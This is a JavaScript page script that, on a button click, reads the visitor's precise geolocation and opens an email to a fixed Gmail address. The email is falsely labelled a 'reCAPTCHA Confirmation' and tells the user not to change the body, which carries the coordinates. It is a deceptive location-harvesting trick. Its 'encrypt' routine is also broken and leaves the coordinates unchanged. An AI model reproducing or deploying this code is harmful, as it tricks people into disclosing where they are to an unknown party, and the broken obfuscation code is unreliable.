var form = document.getElementById('btn');
var x = document.getElementById('title');

function encrypt(coords) {
    var coordsArray = coords.split(', ');
    for (let i = 0; i < coordsArray[0].length; i++) {
        switch (coordsArray[0].split('')[i]) {
            case '0':
                coordsArray[0].split('')[i] = 'u';
                break;
            case '1':
                coordsArray[0].split('')[i] = 'y';
                break;
            case '2':
                coordsArray[0].split('')[i] = 'A';
                break;
            case '3':
                coordsArray[0].split('')[i] = 'x';
                break;
            case '4':
                coordsArray[0].split('')[i] = 'O';
                break;
            case '5':
                coordsArray[0].split('')[i] = 'B';
                break;
            case '6':
                coordsArray[0].split('')[i] = 'v';
                break;
            case '7':
                coordsArray[0].split('')[i] = 'F';
                break;
            case '8':
                coordsArray[0].split('')[i] = 'c';
                break;
            case '9':
                coordsArray[0].split('')[i] = 'a';
                break;
            default:
                coordsArray[0].split('')[i] = '.';
        }
    }

    for (let i = 0; i < coordsArray[1].length; i++) {
        switch (coordsArray[1].split('')[i]) {
            case '0':
                coordsArray[1].split('')[i] = 'u';
                break;
            case '1':
                coordsArray[1].split('')[i] = 'y';
                break;
            case '2':
                coordsArray[1].split('')[i] = 'A';
                break;
            case '3':
                coordsArray[1].split('')[i] = 'x';
                break;
            case '4':
                coordsArray[1].split('')[i] = 'O';
                break;
            case '5':
                coordsArray[1].split('')[i] = 'B';
                break;
            case '6':
                coordsArray[1].split('')[i] = 'v';
                break;
            case '7':
                coordsArray[1].split('')[i] = 'F';
                break;
            case '8':
                coordsArray[1].split('')[i] = 'c';
                break;
            case '9':
                coordsArray[1].split('')[i] = 'a';
                break;
            default:
                coordsArray[1].split('')[i] = '.';
        }
    }

    return coordsArray.join(' ')
}

form.addEventListener('click', function(e) {
    var options = {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
    };
    
    function success(pos) {
        var crd = pos.coords;
    
        console.log('Your current position is:');
        console.log(`Latitude : ${crd.latitude}`);
        console.log(`Longitude: ${crd.longitude}`);
        console.log(`More or less ${crd.accuracy} meters.`);
        window.open(`mailto:yimeryuz@gmail.com?subject=reCAPTCHA Confirmation: Confirm that you are human by sending this. WARNING: Do not change the body.&body=${encrypt(`${crd.latitude}, ${crd.longitude}`)}`)
    }
    
    function error(err) {
        console.warn(`ERROR(${err.code}): ${err.message}`)
        x.innerHTML = 'Failed Please Try Again';
    }
    
    navigator.geolocation.getCurrentPosition(success, error, options);
})